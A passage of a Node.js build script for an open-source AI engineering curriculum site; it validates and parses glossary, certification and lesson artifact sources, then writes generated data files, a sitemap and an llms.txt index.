      lesson.domainsByTrack[track.id] = Array.isArray(ref.domains) ? ref.domains : [];
      lesson.rolesByTrack[track.id] = ref.role || '';
    }
  }

  const assessmentsById = {};
  for (const track of tracks) {
    track.assessments = track.assessments.map((meta, index) => {
      const normalized = typeof meta === 'string' ? { path: meta } : { ...(meta || {}) };
      const assessmentLabel = normalized.id || normalized.title || `assessment ${index + 1}`;
      if (!normalized.path) {
        throw new Error(`Certification assessment "${assessmentLabel}" in track "${track.id}" must declare a source path`);
      }
      const assessmentFile = resolveAssessmentFile(programDir, normalized.path);
      if (!assessmentFile || !fs.existsSync(assessmentFile)) {
        throw new Error(`Missing certification assessment source for "${assessmentLabel}" in track "${track.id}": ${normalized.path}`);
      }
      const data = readJson(assessmentFile, normalized.path);
      const id = normalized.id || data.id || `${track.id}-${normalized.kind || data.kind || `assessment-${index + 1}`}`;
      const merged = {
        ...data,
        ...normalized,
        id,
        programId: program.id,
        track: normalized.track || data.track || track.id,
        kind: normalized.kind || data.kind || 'practice',
        title: normalized.title || data.title || 'Practice assessment',
        timeLimitMinutes: Number(normalized.timeLimitMinutes || data.timeLimitMinutes || 0),
      };
      assessmentsById[id] = merged;
      return {
        id,
        path: normalized.path || '',
        kind: merged.kind,
        title: merged.title,
        timeLimitMinutes: merged.timeLimitMinutes,
        questionCount: Array.isArray(merged.questions) ? merged.questions.length : 0,
      };
    });
  }

  return { program, tracks, lessonsByPath, assessmentsById };
}

function writeCertificationData(certifications) {
  const output = `// Auto-generated by build.js from certifications/ — do not edit manually.\n` +
    `// Last built: ${new Date().toISOString()}\n\n` +
    `const CERTIFICATIONS = ${JSON.stringify(certifications, null, 2)};\n`;
  fs.writeFileSync(CERTIFICATION_OUTPUT_PATH, output, 'utf8');
  console.log(`   wrote certification-data.js (${certifications.tracks.length} tracks)`);
}

// ─── Parse glossary/terms.md ──────────────────────────────────────────
const GLOSSARY_CATEGORY_ORDER = [
  'Math & training',
  'Models & inference',
  'Data & representations',
  'Retrieval & generation',
  'Prompting & context',
  'Agents & tools',
  'Evaluation & safety',
  'AI-native development',
  'Infrastructure & serving',
  'Reliability & operations',
  'Security & governance',
  'Multimodal systems',
];

const GLOSSARY_CATEGORIES = new Set(GLOSSARY_CATEGORY_ORDER);

const GLOSSARY_FIELD_KEYS = new Map([
  ['Category', 'category'],
  ['What people say', 'says'],
  ['What it actually means', 'means'],
  ['Why it matters', 'whyItMatters'],
  ['In practice', 'example'],
  ['Common confusion', 'confusion'],
  ['Aliases', 'aliases'],
  ['Related terms', 'related'],
  ['Learn it', 'lessons'],
  ['Sources', 'sources'],
  ["Why it's called that", 'whyCalled'],
]);

function glossaryError(lineNumber, term, message) {
  const context = term ? ` (term "${term}")` : '';
  throw new Error(`glossary/terms.md:${lineNumber}${context}: ${message}`);
}

function glossarySlug(term) {
  return term
    .normalize('NFKD')
    .replace(/[\u0300-\u036f]/g, '')
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, '-')
    .replace(/^-+|-+$/g, '');
}

function glossaryLookupKey(value) {
  return String(value || '')
    .normalize('NFKD')
    .replace(/[\u0300-\u036f]/g, '')
    .toLocaleLowerCase('en-US')
    .trim()
    .replace(/\s+/g, ' ');
}

function glossaryList(value) {
  return value.split(/[,;]/).map(item => item.trim()).filter(Boolean);
}

function glossaryLinks(value, fieldLabel, lineNumber, term) {
  const links = [];
  let cursor = 0;

  while (cursor < value.length) {
    while (cursor < value.length && /[\s,;]/.test(value[cursor])) cursor++;
    if (cursor >= value.length) break;

    if (value[cursor] === '[') {
      const closeLabel = value.indexOf(']', cursor + 1);
      if (closeLabel === -1 || value[closeLabel + 1] !== '(') {
        glossaryError(lineNumber, term, `${fieldLabel} contains a malformed Markdown link`);
      }
      const label = value.slice(cursor + 1, closeLabel).trim();
      let depth = 1;
      let closeUrl = closeLabel + 2;
      for (; closeUrl < value.length && depth > 0; closeUrl++) {
        if (value[closeUrl] === '\\') {
          closeUrl++;
          continue;
        }
        if (value[closeUrl] === '(') depth++;
        if (value[closeUrl] === ')') depth--;
      }
      if (depth !== 0) {
        glossaryError(lineNumber, term, `${fieldLabel} contains a malformed Markdown link`);
      }
      const url = value.slice(closeLabel + 2, closeUrl - 1).trim();
      if (!label || !url) {
        glossaryError(lineNumber, term, `${fieldLabel} links need both a label and a URL`);
      }
      links.push({ label, url });
      cursor = closeUrl;
    } else {
      const nextSeparator = value.slice(cursor).search(/[,;]/);
      const end = nextSeparator === -1 ? value.length : cursor + nextSeparator;
      const item = value.slice(cursor, end).trim();
      if (/[\[\]]/.test(item)) {
        glossaryError(lineNumber, term, `${fieldLabel} contains a malformed Markdown link`);
      }
      if (item) {
        const isUrl = /^(?:https?:\/\/|\/|\.\.?\/)/.test(item);
        links.push({ label: item, url: isUrl ? item : '' });
      }
      cursor = end;
    }

    while (cursor < value.length && /\s/.test(value[cursor])) cursor++;
    if (cursor < value.length && value[cursor] !== ',' && value[cursor] !== ';') {
      glossaryError(lineNumber, term, `${fieldLabel} items must be separated by a comma or semicolon`);
    }
  }

  return links;
}

function parseGlossary(content) {
  const terms = [];
  let currentTerm = null;
  const seenTerms = new Map();
  const seenSlugs = new Map();
  const lines = content.split(/\r?\n/);

  function finishEntry() {
    if (!currentTerm) return;
    if (!currentTerm.category) {
      glossaryError(currentTerm.headerLine, currentTerm.term, 'missing required field "Category"');
    }
    if (!currentTerm.means) {
      glossaryError(currentTerm.headerLine, currentTerm.term, 'missing required field "What it actually means"');
    }
    const { headerLine, fields, ...entry } = currentTerm;
    terms.push(entry);
    currentTerm = null;
  }

  for (let index = 0; index < lines.length; index++) {
    const line = lines[index];
    const lineNumber = index + 1;
    if (/^###\s*$/.test(line)) glossaryError(lineNumber, '', 'term heading cannot be empty');
    const termMatch = line.match(/^###\s+(.+?)\s*$/);
    if (termMatch) {
      finishEntry();
      const term = termMatch[1].trim();
      const normalizedTerm = term.toLocaleLowerCase('en-US');
      if (seenTerms.has(normalizedTerm)) {
        glossaryError(lineNumber, term, `duplicate term; first declared on line ${seenTerms.get(normalizedTerm)}`);
      }
      const slug = glossarySlug(term);
      if (!slug) glossaryError(lineNumber, term, 'term must contain at least one letter or number');
      if (seenSlugs.has(slug)) {
        const first = seenSlugs.get(slug);
        glossaryError(lineNumber, term, `duplicate slug "${slug}"; first used by "${first.term}" on line ${first.line}`);
      }
      seenTerms.set(normalizedTerm, lineNumber);
      seenSlugs.set(slug, { term, line: lineNumber });
      const firstCharacter = term.normalize('NFKD').replace(/[\u0300-\u036f]/g, '').match(/[a-z0-9]/i);
      currentTerm = {
        term,
        slug,
        letter: firstCharacter ? firstCharacter[0].toUpperCase() : '#',
        category: '',
        says: '',
        means: '',
        whyItMatters: '',
        example: '',
        confusion: '',
        aliases: [],
        related: [],
        lessons: [],
        sources: [],
        whyCalled: '',
        headerLine: lineNumber,
        fields: new Set(),
      };
      continue;
    }

    // Alphabet headings end the previous entry but are not glossary terms.
    if (/^#{1,2}\s+/.test(line)) {
      finishEntry();
      continue;
    }

    const fieldMatch = line.match(/^\s*-\s+\*\*([^*]+):\*\*\s*(.*?)\s*$/);
    if (!currentTerm) {
      if (fieldMatch) glossaryError(lineNumber, '', `field "${fieldMatch[1].trim()}" appears before a term heading`);
      continue;
    }

    if (fieldMatch) {
      const label = fieldMatch[1].trim();
      const value = fieldMatch[2].trim();
      const key = GLOSSARY_FIELD_KEYS.get(label);
      if (!key) glossaryError(lineNumber, currentTerm.term, `unknown field "${label}"`);
      if (currentTerm.fields.has(label)) glossaryError(lineNumber, currentTerm.term, `duplicate field "${label}"`);
      if (!value) glossaryError(lineNumber, currentTerm.term, `field "${label}" cannot be empty`);
      currentTerm.fields.add(label);

      if (key === 'category') {
        if (!GLOSSARY_CATEGORIES.has(value)) {
          glossaryError(lineNumber, currentTerm.term, `unknown category "${value}"`);
        }
        currentTerm.category = value;
      } else if (key === 'aliases' || key === 'related') {
        const items = glossaryList(value);
        if (!items.length) glossaryError(lineNumber, currentTerm.term, `field "${label}" needs at least one item`);
        currentTerm[key] = items;
      } else if (key === 'lessons' || key === 'sources') {
        const links = glossaryLinks(value, label, lineNumber, currentTerm.term);
        if (!links.length) glossaryError(lineNumber, currentTerm.term, `field "${label}" needs at least one item`);
        if (links.some(link => !link.url)) {
          glossaryError(lineNumber, currentTerm.term, `field "${label}" requires a URL for every item`);
        }
        currentTerm[key] = links;
      } else if (key === 'says') {
        currentTerm.says = value.replace(/^"/, '').replace(/"$/, '').trim();
      } else {
        currentTerm[key] = value;
      }
      continue;
    }

    const trimmed = line.trim();
    if (trimmed && !trimmed.startsWith('<!--')) {
      glossaryError(lineNumber, currentTerm.term, 'expected a canonical bullet field or the next term heading');
    }
  }

  finishEntry();

  const lookupOwners = new Map();
  for (const entry of terms) {
    const key = glossaryLookupKey(entry.term);
    const existing = lookupOwners.get(key);
    if (existing) {
      const entryLine = seenTerms.get(entry.term.toLocaleLowerCase('en-US')) || 1;
      glossaryError(
        entryLine,
        entry.term,
        `normalized term collides with canonical term "${existing.label}" on term "${existing.entry.term}"`
      );
    }
    lookupOwners.set(key, { entry, label: entry.term, kind: 'term' });
  }
  for (const entry of terms) {
    const entryLine = seenTerms.get(entry.term.toLocaleLowerCase('en-US')) || 1;
    for (const alias of entry.aliases) {
      const key = glossaryLookupKey(alias);
      const existing = lookupOwners.get(key);
      if (existing) {
        const ownership = existing.entry === entry
          ? `duplicates its ${existing.kind} "${existing.label}"`
          : `collides with ${existing.kind} "${existing.label}" on term "${existing.entry.term}"`;
        glossaryError(entryLine, entry.term, `alias "${alias}" ${ownership}`);
      }
      lookupOwners.set(key, { entry, label: alias, kind: 'alias' });
    }
  }
  for (const entry of terms) {
    const entryLine = seenTerms.get(entry.term.toLocaleLowerCase('en-US')) || 1;
    for (const related of entry.related) {
      if (!lookupOwners.has(glossaryLookupKey(related))) {
        glossaryError(entryLine, entry.term, `related term "${related}" does not resolve to a glossary entry or alias`);
      }
    }
    for (const lesson of entry.lessons) {
      if (/^https?:\/\//i.test(lesson.url)) continue;
      const localPath = path.resolve(path.dirname(GLOSSARY_PATH), lesson.url.split(/[?#]/)[0]);
      const rootWithSep = REPO_ROOT.endsWith(path.sep) ? REPO_ROOT : REPO_ROOT + path.sep;
      if (!localPath.startsWith(rootWithSep) || !fs.existsSync(localPath)) {
        glossaryError(entryLine, entry.term, `Learn it target "${lesson.url}" does not exist in the repository`);
      }
      const stats = fs.statSync(localPath);
      if (stats.isDirectory() && !fs.existsSync(path.join(localPath, 'docs', 'en.md'))) {
        glossaryError(entryLine, entry.term, `Learn it target "${lesson.url}" is not a lesson with docs/en.md`);
      }
    }
  }

  return terms;
}

// ─── Discover outputs/ artifacts (skills / prompts / agents) ──────────
function parseFrontmatter(text) {
  if (!text.startsWith('---')) return null;
  const end = text.indexOf('\n---', 4);
  if (end === -1) return null;
  const block = text.slice(4, end);
  const result = {};
  for (const raw of block.split(/\r?\n/)) {
    const line = raw.trimEnd();
    if (!line || line.startsWith('#') || !line.includes(':')) continue;
    const idx = line.indexOf(':');
    const key = line.slice(0, idx).trim();
    let value = line.slice(idx + 1).trim();
    if (value.startsWith('[') && value.endsWith(']')) {
      const inner = value.slice(1, -1).trim();
      result[key] = inner
        ? inner.split(',').map(s => s.trim().replace(/^['"]|['"]$/g, '')).filter(Boolean)
        : [];
    } else if ((value.startsWith('"') && value.endsWith('"')) ||
               (value.startsWith("'") && value.endsWith("'"))) {
      result[key] = value.slice(1, -1);
    } else {
      result[key] = value;
    }
  }
  return result;
}

function assertRepositoryContainment(targetDir, repoRoot, label) {
  const resolvedRepoRoot = fs.realpathSync(repoRoot);
  const resolvedTarget = fs.realpathSync(targetDir);
  const rootPrefix = resolvedRepoRoot.endsWith(path.sep)
    ? resolvedRepoRoot
    : resolvedRepoRoot + path.sep;
  if (resolvedTarget !== resolvedRepoRoot && !resolvedTarget.startsWith(rootPrefix)) {
    throw new Error(`${label} escapes the repository: ${targetDir}`);
  }
  const targetStat = fs.lstatSync(targetDir);
  if (targetStat.isSymbolicLink() || !targetStat.isDirectory()) {
    throw new Error(`${label} must be a regular directory: ${targetDir}`);
  }
}

function listSkillBundleFiles(bundleDir, repoRoot) {
  const rootStat = fs.lstatSync(bundleDir);
  if (rootStat.isSymbolicLink() || !rootStat.isDirectory()) {
    throw new Error(`Skill bundle must be a regular directory: ${bundleDir}`);
  }
  assertRepositoryContainment(bundleDir, repoRoot, 'Skill bundle');
  const files = [];
  function visit(currentDir, relativeDir) {
    const entries = fs.readdirSync(currentDir, { withFileTypes: true })
      .sort((a, b) => a.name < b.name ? -1 : a.name > b.name ? 1 : 0);
    for (const entry of entries) {
      const fullPath = path.join(currentDir, entry.name);
      const relativePath = relativeDir ? `${relativeDir}/${entry.name}` : entry.name;
      if (entry.isSymbolicLink()) {
        throw new Error(`Skill bundle contains a symlink: ${fullPath}`);
      }
      if (entry.isDirectory()) {
        visit(fullPath, relativePath);
      } else if (entry.isFile()) {
        files.push(relativePath);
      } else {
        throw new Error(`Skill bundle contains a non-regular file: ${fullPath}`);
      }
    }
  }
  visit(bundleDir, '');
  return files.sort();
}

function discoverArtifacts(repoRoot = REPO_ROOT) {
  const artifacts = [];
  const phasesDir = path.join(repoRoot, 'phases');
  if (!fs.existsSync(phasesDir)) return artifacts;
  const VALID_TYPES = ['skill', 'prompt', 'agent'];
  for (const phaseDirName of fs.readdirSync(phasesDir).sort()) {
    const phaseMatch = phaseDirName.match(/^([0-9]{2})-([a-z0-9-]+)$/);
    if (!phaseMatch) continue;
    const phaseId = parseInt(phaseMatch[1], 10);
    const phaseDir = path.join(phasesDir, phaseDirName);
    for (const lessonDirName of fs.readdirSync(phaseDir).sort()) {
      const lessonMatch = lessonDirName.match(/^([0-9]{2})-([a-z0-9-]+)$/);
      if (!lessonMatch) continue;
      const lessonId = parseInt(lessonMatch[1], 10);
      const lessonRel = `phases/${phaseDirName}/${lessonDirName}`;
      const outputsDir = path.join(phaseDir, lessonDirName, 'outputs');
      if (fs.existsSync(outputsDir)) {
        assertRepositoryContainment(outputsDir, repoRoot, 'Lesson outputs');
        const entries = fs.readdirSync(outputsDir, { withFileTypes: true })
          .sort((a, b) => a.name < b.name ? -1 : a.name > b.name ? 1 : 0);
        for (const entry of entries) {
          if (!entry.isFile() || !entry.name.endsWith('.md')) continue;
          const file = entry.name;
          const stem = file.replace(/\.md$/, '');
          const type = VALID_TYPES.find(t => stem.startsWith(`${t}-`));
          if (!type) continue;
          let meta = {};
          try {
            meta = parseFrontmatter(fs.readFileSync(path.join(outputsDir, file), 'utf8')) || {};
          } catch (_) {}
          artifacts.push({
            kind: type,
            name: (meta.name || stem).trim(),
            description: (meta.description || '').trim(),
            tags: Array.isArray(meta.tags) ? meta.tags : [],
            phase: phaseId,
            lesson: lessonId,
            lessonPath: lessonRel,
            file: `${lessonRel}/outputs/${file}`,
          });
        }
        for (const entry of entries) {
          if (!entry.isDirectory()) continue;
          const bundleDir = path.join(outputsDir, entry.name);
          const skillPath = path.join(bundleDir, 'SKILL.md');
          if (!fs.existsSync(skillPath)) continue;
          const files = listSkillBundleFiles(bundleDir, repoRoot);
          if (!files.includes('SKILL.md')) continue;
          let meta = {};
          try {
            meta = parseFrontmatter(fs.readFileSync(skillPath, 'utf8')) || {};
          } catch (_) {}
          artifacts.push({
            kind: 'skill',
            name: (meta.name || entry.name).trim(),
            description: (meta.description || '').trim(),
            tags: Array.isArray(meta.tags) ? meta.tags : [],
            version: (meta.version || '').trim(),
            ...(meta.license && { license: String(meta.license).trim() }),
            ...(meta.compatibility && { compatibility: String(meta.compatibility).trim() }),
            ...(meta['allowed-tools'] && { allowedTools: String(meta['allowed-tools']).trim() }),
            phase: phaseId,
            lesson: lessonId,
            lessonPath: lessonRel,
            file: `${lessonRel}/outputs/${entry.name}/SKILL.md`,
            bundle: true,
            bundlePath: `${lessonRel}/outputs/${entry.name}`,
            files,
          });
        }
      }
      const missionPath = path.join(phaseDir, lessonDirName, 'mission.md');
      if (fs.existsSync(missionPath)) {
        let firstLine = '';
        try {
          firstLine = fs.readFileSync(missionPath, 'utf8').split(/\r?\n/)[0].replace(/^#\s+/, '').trim();
        } catch (_) {}
        artifacts.push({
          kind: 'mission',
          name: firstLine || `${lessonDirName} mission`,
          description: '',
          tags: [],
          phase: phaseId,
          lesson: lessonId,
          lessonPath: lessonRel,
          file: `${lessonRel}/mission.md`,
        });
      }
    }
  }
  return artifacts;
}

// ─── Main build ──────────────────────────────────────────────────────
// Write the git ref this deploy was built from, so lesson.html fetches docs
// from the right branch (PR previews render their own edits, not main).
function resolveRef() {
  let ref = process.env.VERCEL_GIT_COMMIT_REF || '';
  if (!ref) {
    try {
      ref = require('child_process')
        .execSync('git rev-parse --abbrev-ref HEAD', { encoding: 'utf8' })
        .trim();
    } catch (e) { ref = ''; }
  }
  if (!ref || ref === 'HEAD') ref = 'main';
  return ref;
}

function sourceRevision() {
  if (process.env.VERCEL_ENV === 'production') return 'main';
  if (process.env.VERCEL_ENV === 'preview') {
    const sha = String(process.env.VERCEL_GIT_COMMIT_SHA || '').trim();
    return /^[0-9a-f]{7,40}$/i.test(sha) ? sha : resolveRef();
  }
  return 'main';
}

function sourceRepository() {
  const ownerValue = String(process.env.VERCEL_GIT_REPO_OWNER || '').trim();
  const repoValue = String(process.env.VERCEL_GIT_REPO_SLUG || '').trim();
  return {
    owner: /^[A-Za-z0-9-]+$/.test(ownerValue) ? ownerValue : 'rohitg00',
    repo: /^[A-Za-z0-9_.-]+$/.test(repoValue) ? repoValue : 'ai-engineering-from-scratch',
  };
}

function githubSourceUrl(relativePath, view = 'tree') {
  const { owner, repo } = sourceRepository();
  const revision = sourceRevision()
    .split('/')
    .map(encodeURIComponent)
    .join('/');
  const cleanPath = String(relativePath || '')
    .replace(/^\/+|\/+$/g, '')
    .split('/')
    .map(encodeURIComponent)
    .join('/');
  const sourceView = view === 'blob' ? 'blob' : 'tree';
  return `https://github.com/${owner}/${repo}/${sourceView}/${revision}/${cleanPath}`;
}

function writeBuildMeta() {
  const revision = sourceRevision();
  const repository = sourceRepository();
  const js = '// Auto-generated by build.js on each deploy — do not edit.\n'
    + 'window.__AIFS_REF = ' + JSON.stringify(revision) + ';\n'
    + 'window.__AIFS_SOURCE = ' + JSON.stringify({ ...repository, revision }) + ';\n';
  fs.writeFileSync(path.join(__dirname, 'build-meta.js'), js, 'utf8');
  console.log('   wrote build-meta.js (ref: ' + revision + ')');
}

// ─── langs.js: language switcher options, from the canonical registry ────
function writeLangs() {
  const regPath = path.join(REPO_ROOT, 'languages.json');
  let langs = [{ code: 'en', native: 'English' }];
  if (fs.existsSync(regPath)) {
    const reg = JSON.parse(fs.readFileSync(regPath, 'utf8'));
    // Only offer languages the site can actually serve: English (source) plus
    // the ci:true set the translate workflow builds lessons for. The full
    // registry is 40 languages, but picking an untranslated one just 404s to
    // English, so it must not appear in the switcher.
    langs = reg.languages
      .filter(l => l.source || l.ci)
      .map(l => ({ code: l.code, native: l.native }));
  }
  const js = '// Auto-generated by build.js from languages.json — do not edit.\n'
    + 'window.AIFS_LANGS = ' + JSON.stringify(langs) + ';\n';
  fs.writeFileSync(path.join(__dirname, 'langs.js'), js, 'utf8');
  console.log('   wrote langs.js (' + langs.length + ' languages)');
}

function build() {
  console.log('📖 Reading source files...');
  writeBuildMeta();
  writeLangs();
  writeFigureManifest();

  const readme = fs.readFileSync(README_PATH, 'utf8');
  const roadmap = fs.readFileSync(ROADMAP_PATH, 'utf8');
  const glossary = fs.readFileSync(GLOSSARY_PATH, 'utf8');

  console.log('🔍 Parsing ROADMAP.md...');
  const roadmapStatuses = parseRoadmap(roadmap);

  console.log('🔍 Parsing README.md...');
  const phases = parseReadme(readme, roadmapStatuses);
  const roadmapPrereqs = parseCurriculumPrereqs(readme, phases);

  console.log('Parsing focused learning paths...');
  const learningPaths = parseLearningPaths(REPO_ROOT, phases);

  console.log('🔍 Parsing glossary/terms.md...');
  const glossaryTerms = parseGlossary(glossary);

  console.log('🔍 Discovering outputs + Phase 14 missions...');
  const artifacts = discoverArtifacts();

  console.log('🎓 Parsing certification programs...');
  const certifications = parseCertifications();
  writeCertificationData(certifications);

  console.log('📚 Extracting lesson summaries + keywords from docs/en.md...');
  let summarized = 0, withKeywords = 0;
  for (const phase of phases) {
    for (const lesson of phase.lessons) {
      if (lesson.url) {
        const relPath = lesson.url.replace(GITHUB_BASE, '').replace(/\/+$/, '');
        const meta = extractLessonMeta(relPath);
        if (meta.summary)  { lesson.summary  = meta.summary;  summarized++;   }
        if (meta.keywords) { lesson.keywords = meta.keywords; withKeywords++; }
      }
    }
  }

  console.log('🔎 Generating lesson and certification SEO manifests...');
  const seoManifests = writeSeoArtifacts(phases, certifications, learningPaths);
  writeSponsorsPage();

  // Stats
  let totalLessons = 0;
  let completeLessons = 0;
  phases.forEach(p => {
    totalLessons += p.lessons.length;
    completeLessons += p.lessons.filter(l => l.status === 'complete').length;
  });

  console.log(`\n📊 Stats:`);
  console.log(`   Phases: ${phases.length}`);
  console.log(`   Lessons: ${totalLessons}`);
  console.log(`   Complete: ${completeLessons}`);
  console.log(`   Summaries: ${summarized}, Keywords: ${withKeywords}`);
  console.log(`   Glossary terms: ${glossaryTerms.length}`);
  console.log(`   Artifacts: ${artifacts.length}`);
  console.log(`   Curriculum edges: ${Object.values(roadmapPrereqs).reduce((sum, ids) => sum + ids.length, 0)}`);
  console.log(`   Focused learning paths: ${learningPaths.length}`);
  console.log(`   Certification tracks: ${certifications.tracks.length}`);
  console.log(`   Certification lessons: ${Object.keys(certifications.lessonsByPath).length}`);
  console.log(`   Practice assessments: ${Object.keys(certifications.assessmentsById).length}`);

  // Generate data.js
const output = `// Auto-generated by build.js — do not edit manually.
// Last built: ${new Date().toISOString()}

const ROADMAP_PREREQS = ${JSON.stringify(roadmapPrereqs, null, 2)};

const PHASES = ${JSON.stringify(phases, null, 2)};

const LEARNING_PATHS = ${JSON.stringify(learningPaths, null, 2)};

const GLOSSARY_CATEGORY_ORDER = ${JSON.stringify(GLOSSARY_CATEGORY_ORDER, null, 2)};

const GLOSSARY = ${JSON.stringify(glossaryTerms, null, 2)};

const ARTIFACTS = ${JSON.stringify(artifacts, null, 2)};
`;

  fs.writeFileSync(OUTPUT_PATH, output, 'utf8');
  console.log(`\n✅ Generated ${OUTPUT_PATH}`);

  syncCounts(totalLessons, phases.length, artifacts.length);
  syncCertificationStats(certifications);
  syncReadme(totalLessons);
  writeSitemap(seoManifests.lessonManifest, glossaryTerms.length, certifications);
  writeLlms(phases, glossaryTerms.length, artifacts.length, certifications);
}

// ─── sitemap.xml from the same SEO manifest the lesson route renders ─────
function writeSitemap(lessonManifest, glossaryCount, certifications) {
  const urls = [
    { loc: '/', priority: '1.0', freq: 'weekly' },
    { loc: '/catalog.html', priority: '0.8', freq: 'weekly' },
    { loc: '/prereqs.html', priority: '0.7', freq: 'monthly' },
    { loc: '/learning-paths.html', priority: '0.8', freq: 'monthly' },
    { loc: '/about.html', priority: '0.5', freq: 'yearly' },
    { loc: '/developer.html', priority: '0.6', freq: 'monthly' },
    { loc: '/contact.html', priority: '0.3', freq: 'yearly' },
    { loc: '/privacy.html', priority: '0.3', freq: 'yearly' },
    { loc: '/sponsors.html', priority: '0.5', freq: 'monthly' },
  ];
  if (glossaryCount > 0) urls.push({ loc: '/glossary.html', priority: '0.6', freq: 'monthly' });
  if (certifications && certifications.programs && certifications.programs.length) {
    urls.push({ loc: '/certifications.html', priority: '0.9', freq: 'weekly' });
    for (const track of certifications.tracks) {
      urls.push({ loc: '/certification?id=' + encodeURIComponent(track.id), priority: '0.8', freq: 'monthly' });
    }
    for (const lesson of Object.values(certifications.lessonsByPath)) {
      urls.push({ loc: '/lesson?path=' + encodeURIComponent(lesson.path), priority: '0.7', freq: 'monthly' });
    }
  }
  for (const lesson of Object.values(lessonManifest.lessons || {})) {
    if (lesson.context && lesson.context.kind === 'course') {
      urls.push({ loc: '/lesson?path=' + encodeURIComponent(lesson.path), priority: '0.6', freq: 'monthly' });
    }
  }
  const body = urls.map(u =>
    `  <url>\n    <loc>${SITE_ORIGIN}${u.loc.replace(/&/g, '&amp;')}</loc>\n` +
    `    <changefreq>${u.freq}</changefreq>\n` +
    `    <priority>${u.priority}</priority>\n  </url>`).join('\n');
  const xml = `<?xml version="1.0" encoding="UTF-8"?>\n` +
    `<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n${body}\n</urlset>\n`;
  fs.writeFileSync(path.join(__dirname, 'sitemap.xml'), xml, 'utf8');
  console.log(`   wrote sitemap.xml (${urls.length} URLs)`);
}

// ─── llms.txt: a link-rich map of the curriculum for AI agents ───────────
function writeLlms(phases, glossaryCount, artifactCount, certifications) {
  const rawOrigin = 'https://raw.githubusercontent.com/rohitg00/ai-engineering-from-scratch/' + resolveRef();
  let total = 0;
  phases.forEach(p => { total += p.lessons.filter(l => lessonPath(l.url)).length; });
  let out = `# AI Engineering from Scratch\n\n`;
  out += `> A free, open-source curriculum that builds every core AI algorithm by hand — ${total} lessons across ${phases.length} phases, from linear algebra to autonomous agents. Python, TypeScript, Rust, Julia.\n\n`;
  out += `Canonical site: ${SITE_ORIGIN}\n`;
  out += `Source: https://github.com/rohitg00/ai-engineering-from-scratch\n`;
  out += `Glossary terms: ${glossaryCount} · Reusable outputs (prompts/skills/agents): ${artifactCount}\n\n`;
  out += `## Developer resources\n`;
  out += `- [Developer documentation](${SITE_ORIGIN}/developer.html) — machine-readable site contracts and integration notes\n`;
  out += `- [OpenAPI description](${SITE_ORIGIN}/openapi.json) — read-only public resource inventory\n`;
  out += `- [Sitemap](${SITE_ORIGIN}/sitemap.xml) — canonical URL inventory\n`;
  out += `- [Contact](${SITE_ORIGIN}/contact.html) — maintainer and project contact route\n`;
  out += `- [Privacy](${SITE_ORIGIN}/privacy.html) — data and analytics policy\n\n`;
  out += `Lesson routes include crawler-readable titles, summaries, navigation, and canonical URLs. Each raw markdown link below is the complete source text. Lesson directories may also include code/ (runnable implementation) and quiz.json.\n\n`;
  for (const phase of phases) {
    out += `## Phase ${phase.id}: ${phase.name}\n`;
    if (phase.desc) out += `${phase.desc}\n`;
    out += `\n`;
    for (const l of phase.lessons) {
      const p = lessonPath(l.url);
      if (!p) continue;
      const note = l.summary ? ` — ${l.summary}` : '';
      out += `- [${l.name}](${SITE_ORIGIN}/lesson?path=${encodeURIComponent(p)}) · [raw](${rawOrigin}/${p}/docs/en.md)${note}\n`;
    }
    out += `\n`;
  }
  out += `## Optional\n`;
  out += `- [Catalog](${SITE_ORIGIN}/catalog.html) — full searchable lesson index\n`;
  out += `- [Roadmap](${SITE_ORIGIN}/prereqs.html) — prerequisite ordering across phases\n`;
  out += `- [AI Engineering Learning Paths](${SITE_ORIGIN}/learning-paths.html) — four core domain paths and six career routes connected to practical lessons\n`;
  if (glossaryCount > 0) out += `- [Glossary](${SITE_ORIGIN}/glossary.html) — plain-language definitions of ${glossaryCount} terms\n`;
  out += `- [Sponsor the project](${SITE_ORIGIN}/sponsors.html) — sponsorship tiers, rules, and current sponsors from SPONSORS.md\n`;
  if (certifications && certifications.programs && certifications.programs.length) {
    out += `\n## Certification preparation\n`;
    out += `Independent, open-source practice material. Practice scores are not official exam scores and completion does not guarantee certification.\n\n`;
    for (const program of certifications.programs) {
      if (program.learnerGuidePath) out += `- [${program.name} learner guide](${rawOrigin}/${program.learnerGuidePath})\n`;
      if (program.tutorSkillPath) out += `- [${program.name} tutor contract](${rawOrigin}/${program.tutorSkillPath})\n`;
    }
    out += `- [Certification catalog](${SITE_ORIGIN}/certifications.html)\n`;
    for (const track of certifications.tracks) {
      out += `- [${track.credential || track.shortName || track.id}](${SITE_ORIGIN}/certification?id=${encodeURIComponent(track.id)})`;
      if (track.summary) out += ` — ${track.summary}`;
      out += `\n`;
    }
    const certRawOrigin = 'https://raw.githubusercontent.com/rohitg00/ai-engineering-from-scratch/' + resolveRef();
    for (const lesson of Object.values(certifications.lessonsByPath)) {
      out += `- [${lesson.name}](${SITE_ORIGIN}/lesson?path=${encodeURIComponent(lesson.path)}) · [raw](${certRawOrigin}/${lesson.path}/docs/en.md)`;
      if (lesson.summary) out += ` — ${lesson.summary}`;
      out += `\n`;
    }
  }
  fs.writeFileSync(path.join(__dirname, 'llms.txt'), out, 'utf8');
  console.log(`   wrote llms.txt`);
}

// ─── Regenerate README stats block + lessons badge from source ───────────
function syncReadme(lessons) {
  const readmePath = path.join(REPO_ROOT, 'README.md');
  if (!fs.existsSync(readmePath)) return;
  let md = fs.readFileSync(readmePath, 'utf8');
  const before = md;

  // Keep the lessons badge in sync with the live count (URL value + alt text)
  md = md.replace(/badge\/lessons-\d+-/g, `badge/lessons-${lessons}-`);
  md = md.replace(/alt="\d+ lessons"/g, `alt="${lessons} lessons"`);

  // Regenerate the traffic proof block from site/stats.json
  const statsPath = path.join(__dirname, 'stats.json');
  if (fs.existsSync(statsPath)) {
    try {
      const s = JSON.parse(fs.readFileSync(statsPath, 'utf8'));
      const fmt = n => Number(n).toLocaleString('en-US');
      const block =
        '<!-- STATS:START (generated from site/stats.json by build.js — do not edit by hand) -->\n' +
        `<p align="center"><sub><b>${fmt(s.visitors30d)}</b> readers &nbsp;·&nbsp; ` +
        `<b>${fmt(s.pageViews30d)}</b> page views in the last ${s.period} &nbsp;·&nbsp; ` +
        `as of ${s.updated}</sub></p>\n` +
        '<!-- STATS:END -->';
      const statsRe = /(?:<!-- STATS:START[\s\S]*?<!-- STATS:END -->|\[stats-start\]: #[\s\S]*?\[stats-end\]: #)/;
      if (statsRe.test(md)) {
        md = md.replace(statsRe, block);
      } else {
        // Self-heal: re-insert the block if the markers were removed/mangled
